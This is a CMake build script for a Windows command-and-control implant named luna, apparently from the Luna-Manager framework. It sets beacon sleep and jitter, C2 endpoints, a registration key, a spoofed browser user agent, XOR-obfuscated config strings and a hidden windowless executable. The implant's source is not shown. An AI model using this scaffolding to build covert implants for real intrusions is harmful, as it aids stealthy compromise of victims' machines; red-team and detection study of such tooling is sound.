cmake_minimum_required(VERSION 3.20)
project(luna_implant LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

if(NOT WIN32)
    message(FATAL_ERROR "The implant targets Windows x64. Cross-compile with mingw-w64 or build on Windows.")
endif()

# --- build-time configuration ------------------------------------------------
# These mirror the variables the Luna-Manager builder substitutes. Override any
# of them with -D when building by hand.
set(BUILD_ID        "b_manual"                CACHE STRING "build identifier")
set(IMPLANT_NAME    "luna"                    CACHE STRING "implant name")
set(TRANSPORT       "https"                   CACHE STRING "https or tcp")
set(PROTO_VERSION   "1"                       CACHE STRING "wire protocol version")
set(SLEEP           "60"                      CACHE STRING "default check-in interval")
set(JITTER          "20"                      CACHE STRING "default jitter percent")
set(CAP_MASK        "0x0000FFFF"              CACHE STRING "capability bitmask")
set(REG_KEY         "0000000000000000000000000000000000000000000000000000000000000000"
                                                  CACHE STRING "registration key, hex")
set(CERT_FP         ""                        CACHE STRING "listener certificate sha256, hex")
set(USER_AGENT      "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" CACHE STRING "user agent")
set(MUTEX           "Global\\luna-manual"     CACHE STRING "single instance mutex")
set(XOR_KEY         "00"                      CACHE STRING "config string key, hex")
set(ENDPOINTS       "127.0.0.1:8443"          CACHE STRING "comma separated host:port list")

string(REPLACE "," ";" ENDPOINT_LIST "${ENDPOINTS}")
set(ENDPOINT_COUNT 0)
set(ENDPOINTS_WIDE "")
foreach(ep IN LISTS ENDPOINT_LIST)
    string(STRIP "${ep}" ep)
    if(NOT ep STREQUAL "")
        math(EXPR ENDPOINT_COUNT "${ENDPOINT_COUNT} + 1")
        if(ENDPOINTS_WIDE STREQUAL "")
            set(ENDPOINTS_WIDE "L\"${ep}\"")
        else()
            set(ENDPOINTS_WIDE "${ENDPOINTS_WIDE}, L\"${ep}\"")
        endif()
    endif()
endforeach()

string(LENGTH "${XOR_KEY}" XOR_LEN)
set(XOR_BYTES "")
set(IDX 0)
while(IDX LESS XOR_LEN)
    string(SUBSTRING "${XOR_KEY}" ${IDX} 2 pair)
    if(XOR_BYTES STREQUAL "")
        set(XOR_BYTES "0x${pair}")
    else()
        set(XOR_BYTES "${XOR_BYTES},0x${pair}")
    endif()
    math(EXPR IDX "${IDX} + 2")
endwhile()
if(XOR_BYTES STREQUAL "")
    set(XOR_BYTES "0x00")
endif()

configure_file(
    "${CMAKE_CURRENT_SOURCE_DIR}/config/luna_config.hpp.in"
    "${CMAKE_CURRENT_BINARY_DIR}/generated/luna_config.hpp"
    @ONLY
)

# --- target ------------------------------------------------------------------
add_executable(luna WIN32
    src/main.cpp
    src/crypto.cpp
    src/transport.cpp
    src/modules.cpp
    src/dispatch.cpp
    src/exec.cpp
    src/sysutil.cpp
)

target_include_directories(luna PRIVATE
    "${CMAKE_CURRENT_SOURCE_DIR}/src"
    "${CMAKE_CURRENT_BINARY_DIR}/generated"
)

target_compile_definitions(luna PRIVATE WIN32_LEAN_AND_MEAN UNICODE _UNICODE)
target_link_libraries(luna PRIVATE
    ws2_32 winhttp bcrypt crypt32 advapi32 shell32 psapi userenv ntdll
)

if(MSVC)
    target_compile_options(luna PRIVATE /W4 /permissive- /EHsc /MT)
    target_link_options(luna PRIVATE /SUBSYSTEM:WINDOWS)
else()
    target_compile_options(luna PRIVATE -Wall -Wextra -O2)
    target_link_options(luna PRIVATE -municode -static -static-libgcc -static-libstdc++)
endif()

set_target_properties(luna PROPERTIES OUTPUT_NAME "${IMPLANT_NAME}")
